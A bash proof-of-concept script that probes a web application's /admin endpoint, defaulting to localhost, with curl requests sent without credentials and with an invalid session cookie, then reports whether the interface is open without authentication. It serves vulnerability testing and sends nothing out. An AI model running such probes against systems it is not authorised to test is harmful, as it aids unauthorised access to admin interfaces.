#!/bin/bash

# POC: Missing Authentication on Admin Interface
# This script demonstrates that the /admin endpoint is accessible without any authentication

TARGET="${1:-http://localhost:8080}"
ADMIN_URL="${TARGET}/admin"

echo "[*] Testing Missing Authentication on Admin Interface"
echo "[*] Target: $ADMIN_URL"
echo ""

# Test 1: Direct access to /admin without authentication
echo "[TEST 1] GET request to /admin without authentication headers"
echo "Command: curl -v -w '\nHTTP Status: %{http_code}\n' $ADMIN_URL"
echo ""
RESPONSE=$(curl -s -w "\n%{http_code}" "$ADMIN_URL")
HTTP_CODE=$(echo "$RESPONSE" | tail -1)
BODY=$(echo "$RESPONSE" | head -n -1)

echo "Response:"
echo "$BODY" | head -20
echo ""
echo "HTTP Status Code: $HTTP_CODE"
echo ""

if [ "$HTTP_CODE" = "200" ]; then
    echo "[+] VULNERABLE: Admin interface is accessible without authentication (HTTP 200)"
    AUTH_RESULT="VULNERABLE"
else
    echo "[-] Response code is $HTTP_CODE (not 200)"
    AUTH_RESULT="NOT_VULNERABLE"
fi

echo ""

# Test 2: Verify no authentication required with invalid session cookie
echo "[TEST 2] GET request to /admin with invalid session cookie"
echo "Command: curl -s -w '\nHTTP Status: %{http_code}\n' -H 'Cookie: session=invalid_token_12345' $ADMIN_URL"
echo ""
RESPONSE2=$(curl -s -w "\n%{http_code}" -H "Cookie: session=invalid_token_12345" "$ADMIN_URL")
HTTP_CODE2=$(echo "$RESPONSE2" | tail -1)
BODY2=$(echo "$RESPONSE2" | head -n -1)

echo "Response:"
echo "$BODY2" | head -20
echo ""
echo "HTTP Status Code: $HTTP_CODE2"
echo ""

if [ "$HTTP_CODE2" = "200" ]; then
    echo "[+] VULNERABLE: Admin interface still accessible with invalid session cookie (HTTP 200)"
    echo "[+] This confirms no authentication validation is performed"
else
    echo "[-] Response code is $HTTP_CODE2"
fi

echo ""

# Test 3: Check if there's a redirect to login
echo "[TEST 3] Checking for redirect to login page"
echo "Command: curl -s -L -w 'Final URL: %{url_effective}\n' -o /dev/null $ADMIN_URL"
FINAL_URL=$(curl -s -L -w '%{url_effective}' -o /dev/null "$ADMIN_URL")
echo "Final URL after redirects: $FINAL_URL"
echo ""

if [[ "$FINAL_URL" == *"/login"* ]]; then
    echo "[-] Page redirects to login - authentication may be implemented"
elif [[ "$FINAL_URL" == *"/admin"* ]]; then
    echo "[+] VULNERABLE: No redirect to login - admin interface directly accessible"
fi

echo ""
echo "========== SUMMARY =========="
echo "Admin Interface Authentication Status: $AUTH_RESULT"
echo "HTTP Response Code (Test 1): $HTTP_CODE"
echo "HTTP Response Code (Invalid Session Test 2): $HTTP_CODE2"
echo ""

# Determine if vulnerable
if [ "$HTTP_CODE" = "200" ] && [ "$HTTP_CODE2" = "200" ]; then
    echo "[!] CONCLUSION: Admin interface is MISSING AUTHENTICATION - CRITICAL VULNERABILITY"
    exit 0
else
    echo "[!] CONCLUSION: Could not confirm missing authentication vulnerability"
    exit 1
fi